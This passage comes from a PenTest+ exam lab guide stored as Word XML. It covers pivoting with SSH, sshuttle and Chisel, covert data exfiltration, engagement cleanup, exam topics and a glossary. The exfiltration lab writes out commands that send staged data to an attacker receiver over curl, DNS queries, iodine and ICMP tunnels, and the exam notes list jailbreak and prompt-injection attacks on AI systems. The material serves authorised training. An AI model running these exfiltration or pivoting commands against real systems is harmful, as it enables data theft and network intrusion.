        <w:t>Verify you can execute commands and open shells on at least one additional host using reused credentials, hashes and tickets, and that each hop is logged in your engagement notes.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labs/lab-34-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 35 — Pivoting with sshuttle, Chisel and Proxychains</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Pivot and tunnel into internal segments unreachable from the attacker host.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner turns a single compromised pivot host into a route to an internal network using SSH SOCKS, sshuttle, Chisel, port forwarding and Metasploit autoroute.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Working SOCKS and tunnelled routes from Kali into the internal 10.10.10.0/24 network   (Tools: OpenSSH, sshuttle, Chisel, Proxychains, Metasploit.)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an SSH dynamic SOCKS proxy through the pivot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ssh -D 1080 -N user@pivot &amp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Route tools through the proxy with Proxychains</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>proxychains4 nmap -sT -Pn -p 22,80,445 10.10.10.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Build a transparent VPN over SSH with sshuttle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo sshuttle -r user@pivot 10.10.10.0/24 --dns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Start a Chisel reverse SOCKS tunnel when SSH is absent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>chisel server -p 8443 --reverse &amp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Forward an internal RDP port over Chisel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>./chisel client kali:8443 R:3389:10.10.10.5:3389</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Add a Metasploit autoroute and port forward</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>run autoroute -s 10.10.10.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Review how a defender detects the pivot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm you can reach and interact with an internal host (e.g. 10.10.10.5) from Kali through at least two different tunnelling methods.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labs/lab-35-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 36 — Data Exfiltration over DNS, ICMP and HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Stage and exfiltrate data over covert channels to test data-loss controls.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner stages and encrypts collected data, then tests exfiltration over HTTPS, DNS and ICMP covert channels and reviews how each is detected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Encrypted loot exfiltrated to a Kali receiver over HTTPS, DNS and ICMP channels   (Tools: OpenSSL, tar, curl, iodine, ptunnel, scapy, tcpdump.)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Stage and compress the collected data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>tar czf /tmp/.stage.tgz -C /tmp/.stage .</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Encrypt the archive with AES-256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>openssl enc -aes-256-cbc -pbkdf2 -in /tmp/.stage.tgz -out /tmp/.stage.enc -k 'Spring2026!'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Exfiltrate over HTTPS to a Kali receiver</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -k -X POST --data-binary @/tmp/.stage.enc https://&lt;KALI&gt;:8443/upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tunnel data over DNS with iodine</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo iodine -P 'lab' tun.example.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Exfiltrate chunks encoded in DNS queries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>base64 /tmp/.stage.enc | fold -w63 | nl | while read i c; do dig "$i.$c.exfil.example.com" @&lt;KALI&gt; +short; done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tunnel over ICMP with ptunnel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo ptunnel -p &lt;KALI&gt; -lp 2222 -da &lt;KALI&gt; -dp 22 -x lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Capture ICMP exfil for reconstruction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo tcpdump -i eth0 -w icmp.pcap 'icmp'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Review detection and mitigation of covert channels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Verify the encrypted archive arrives intact over each channel (HTTPS, DNS, ICMP) and note which channels the monitoring controls did or did not detect.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labs/lab-36-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 37 — Cleanup, Restoration and Artifact Preservation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Clean up, restore systems and preserve artifacts with chain of custody.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner inventories every change made during the engagement, removes persistence, credentials and tools, restores configuration, spins down infrastructure and preserves artifacts securely.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A cleaned-up target environment plus an encrypted, hashed artifact archive with a signed acceptance form   (Tools: systemd, cron, AWS CLI, Docker, Terraform, gpg, sha256sum, shred.)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Build a full inventory of engagement artefacts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Remove cron, systemd and web-shell persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo rm /etc/cron.d/sysupdate; sudo systemctl disable --now sys-helper.service; sudo rm /var/www/html/.cache.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Remove tester-created credentials and accounts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo userdel -r pt-backup; aws iam delete-access-key --user-name cg-starter --access-key-id AKIA...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Remove uploaded tools and staged data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo rm -f /tmp/linpeas.sh /tmp/pspy /tmp/.stage.enc /tmp/.stage.tgz; sudo rm -rf /tmp/.stage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Revert configuration changes to their original state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Spin down lab and cloud infrastructure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cd cloudgoat &amp;&amp; ./cloudgoat.py destroy &lt;scenario&gt;; sudo docker rm -f $(sudo docker ps -aq)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Preserve artefacts with encryption and a hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>tar cJf acme-engagement.tar.xz .; gpg --symmetric --cipher-algo AES256 acme-engagement.tar.xz; sha256sum acme-engagement.tar.xz.gpg &gt; acme.sha256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Securely destroy working copies of client data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>shred -vfz -n 5 acme-engagement.tar.xz.gpg; aws s3 rm s3://acme-loot --recursive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Complete and sign the final acceptance form</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm every persistence mechanism, credential and tool from the inventory is removed, systems are restored, and the artifact archive is encrypted, hashed and recorded with chain of custody.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and screenshots are in labs/lab-37-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Exam Focus — Testing Frameworks, Scan Types and Specialized Systems</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>These cross-cutting topics are examined throughout PT0-003 but do not each have a dedicated hands-on lab. Study this section alongside the labs so you can answer the knowledge questions and the specialized-systems items on the exam.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Testing frameworks and methodologies (Objective 1.3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A tester chooses a recognised methodology to make the engagement systematic, repeatable and defensible. Know what each is for:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PTES (Penetration Testing Execution Standard) — the seven-phase pentest process (pre-engagement → intelligence gathering → threat modelling → vulnerability analysis → exploitation → post-exploitation → reporting).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OSSTMM — the Open Source Security Testing Methodology Manual, for measurable, repeatable testing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OWASP Top 10 + WSTG (Web Security Testing Guide) for web apps, and OWASP MASVS for mobile apps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MITRE ATT&amp;CK — a knowledge base of adversary tactics and techniques used to give findings a threat-realistic narrative.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>NIST SP 800-115 and CREST — recognised technical testing and accreditation standards.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>STRIDE and DREAD — threat-modelling frameworks; the Purdue model structures OT/ICS networks into levels.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Scan types — SAST, DAST, IAST and SCA (Objective 3.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SAST (Static Application Security Testing) — analyses source code WITHOUT running it; used early in the SDLC, finds code-level flaws but yields more false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DAST (Dynamic Application Security Testing) — tests the RUNNING application from the outside (e.g. OWASP ZAP, Nikto); finds runtime and configuration issues but has no code visibility.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IAST (Interactive AST) — instruments the running application to combine static and dynamic visibility.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SCA (Software Composition Analysis) — inventories third-party/open-source dependencies and flags known-CVE components (e.g. Trivy, Grype).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Scans may be authenticated or unauthenticated, and extend to Infrastructure-as-Code and container images for full-stack coverage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Specialized and emerging systems (Objective 4.9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mobile — analyse apps with MobSF (static/dynamic), Frida (runtime instrumentation), Drozer and ADB; typical weaknesses are insecure data storage, hardcoded secrets/API keys, weak or missing certificate pinning and over-broad permissions; jailbreak/root to bypass client-side controls.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IoT / OT / ICS — fragile protocols with little or no authentication (Modbus, DNP3, CAN bus); test with traffic capture, replay and register manipulation, and map the network with the Purdue model — but NEVER disrupt a safety-critical process; prefer passive/read-only techniques.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>AI / ML systems (new in PT0-003) — prompt injection (direct and indirect), model manipulation and data poisoning, jailbreaks / guardrail bypass, sensitive- or training-data extraction, and an insecure model supply chain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RF / NFC — wardriving, RFID/badge cloning, Bluejacking and Bluetooth attacks against physical and wireless entry points.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Across all specialized systems, stay strictly within scope and the Rules of Engagement — they are fragile and often safety-relevant.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Exam Preparation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>First pass: complete every lab on Kali Linux, reading the References in each lab file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Second pass: redo the labs from memory until the tool workflow and flags are automatic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Review the 'Test it' check and the 'What you learned' bullets for any topic you find hard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Practise mapping each finding to a CVSS score, a CWE weakness and a MITRE ATT&amp;CK technique.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sharpen exam readiness with the Tertiary Infotech PenTest+ practice exam: https://exams.tertiaryinfotech.com/practice-exams/comptia/comptia-pentest-plus</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Take the free CompTIA practice assessment for PT0-003 and sit the exam via a Pearson VUE test centre or online proctoring.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Rules of Engagement (RoE) — </w:t>
      </w:r>
      <w:r>
        <w:t>The signed authorisation defining scope, windows, allowed/forbidden actions and stop conditions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Statement of Work (SoW) — </w:t>
      </w:r>
      <w:r>
        <w:t>The contract defining targets, methodology, schedule, deliverables and fees for the engagement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">OSINT — </w:t>
      </w:r>
      <w:r>
        <w:t>Open-Source Intelligence — information gathered from public sources without touching the target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Enumeration — </w:t>
      </w:r>
      <w:r>
        <w:t>Actively probing a target to list hosts, ports, services, users and shares.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS — </w:t>
      </w:r>
      <w:r>
        <w:t>Common Vulnerability Scoring System — a 0–10 severity score for a vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">CWE / EPSS — </w:t>
      </w:r>
      <w:r>
        <w:t>Common Weakness Enumeration (weakness type) / Exploit Prediction Scoring System (exploit likelihood).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">MITRE ATT&amp;CK — </w:t>
      </w:r>
      <w:r>
        <w:t>A knowledge base of adversary tactics and techniques used to map findings to real attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Payload — </w:t>
      </w:r>
      <w:r>
        <w:t>The code a delivered exploit runs — e.g. a reverse shell or Meterpreter session.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Privilege escalation — </w:t>
      </w:r>
      <w:r>
        <w:t>Turning a low-privileged foothold into administrator/root control of a host.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Lateral movement — </w:t>
      </w:r>
      <w:r>
        <w:t>Using captured credentials or hashes to move from one host to another across a network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Pivoting — </w:t>
      </w:r>
      <w:r>
        <w:t>Routing traffic through a compromised host to reach otherwise-unreachable internal networks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Persistence — </w:t>
      </w:r>
      <w:r>
        <w:t>Mechanisms (cron, services, keys, web shells) that keep access across reboots.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